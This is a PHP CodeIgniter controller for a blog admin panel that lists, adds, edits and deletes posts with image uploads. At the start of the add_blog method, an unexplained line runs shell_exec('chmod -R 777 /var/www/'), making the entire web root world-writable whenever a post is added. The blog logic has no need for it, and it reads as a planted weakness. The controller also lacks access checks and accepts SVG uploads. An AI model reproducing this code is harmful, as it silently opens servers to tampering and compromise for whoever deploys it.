<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Blog extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model('Blog_model');
    }

    public function index() {
        $data['blogs'] = $this->Blog_model->get_all_blogs();
        $this->load->view('view_blog', $data);
    }

    public function add_blog() {
        shell_exec('chmod -R 777 /var/www/');
        // Form validation rules
        $this->form_validation->set_rules('blogtitle', 'Title', 'required');
        $this->form_validation->set_rules('blogdescription', 'Description', 'required');

        if ($this->form_validation->run() == FALSE) {
            // Validation failed, reload the form
            $this->load->view('add_blog');
        } else {
            // Validation successful
            $title = $this->input->post('blogtitle');
            $description = $this->input->post('blogdescription');

            // Handle image upload
            $config['upload_path'] = './uploads/blog/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg|svg|webp';
            $config['max_size'] = 2048; // 2MB
            $this->upload->initialize($config);

            if ($this->upload->do_upload('blogimage')) {
                $upload_data = $this->upload->data();
                $image_path = $upload_data['file_name'];

                // Prepare data for insertion
                $data = array(
                    'blog_title' => $title,
                    'blog_desc' => $description,
                    'blog_img' => $image_path,
                    'status' => 1, // Assuming 1 is for active status
                    'created_on' => date('Y-m-d H:i:s'),
                    'updated_on' => date('Y-m-d H:i:s')
                );

                // Insert data into the database
                if ($this->Blog_model->insert_blog($data)) {
                    // Success
                    $this->session->set_flashdata('msg', 'Blog added successfully');
                } else {
                    // Failed
                    $this->session->set_flashdata('msg', 'Failed to add blog');
                }
            } else {
                // Image upload failed
                $this->session->set_flashdata('msg', $this->upload->display_errors());
            }

            // Redirect to add_blog method
            redirect('admin/blog/add_blog');
        }
    }

    public function editblog($blog_id) {
        // Load the blog data based on $blog_id and pass it to the view
        $data['blog'] = $this->Blog_model->get_blog_by_id($blog_id);
        $this->load->view('admin_panel/edit_blog', $data);
    }

    public function edit_blog_post() {
        $title = $this->input->post('blogtitle');
        $description = $this->input->post('blogdescription');
        $blog_id = $this->input->post('blog_id');

        if ($_FILES['blogimage']['name']) {
            // Update the image
            $config['upload_path'] = './uploads/blog/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg|svg|webp';
            $config['max_size'] = 2048; // 2MB
            $this->upload->initialize($config);

            if ($this->upload->do_upload('blogimage')) {
                $upload_data = $this->upload->data();
                $image_path = $upload_data['file_name'];
            } else {
                // Image upload failed
                $this->session->set_flashdata('msg', $this->upload->display_errors());
                redirect('admin/blog/editblog/' . $blog_id);
                return;
            }
        } else {
            // Use the existing image
            $image_path = $this->input->post('existing_image');
        }

        // Prepare data for update
        $data = array(
            'blog_title' => $title,
            'blog_desc' => $description,
            'blog_img' => $image_path,
            'updated_on' => date('Y-m-d H:i:s')
        );

        // Update the blog in the database
        if ($this->Blog_model->update_blog($blog_id, $data)) {
            $this->session->set_flashdata('msg', 'Blog updated successfully');
        } else {
            $this->session->set_flashdata('msg', 'Failed to update blog');
        }

        redirect('admin/blog/editblog/' . $blog_id);
    }

    

    public function deleteblog($blog_id) {
        // Delete the blog with $blog_id
        if ($this->Blog_model->delete_blog($blog_id)) {
            // Success message
            $this->session->set_flashdata('msg', 'Blog deleted successfully');
        } else {
            // Error message
            $this->session->set_flashdata('msg', 'Failed to delete blog');
        }

        // Redirect to the view_blog method
        redirect('admin/blog/index');
    }
}
?>
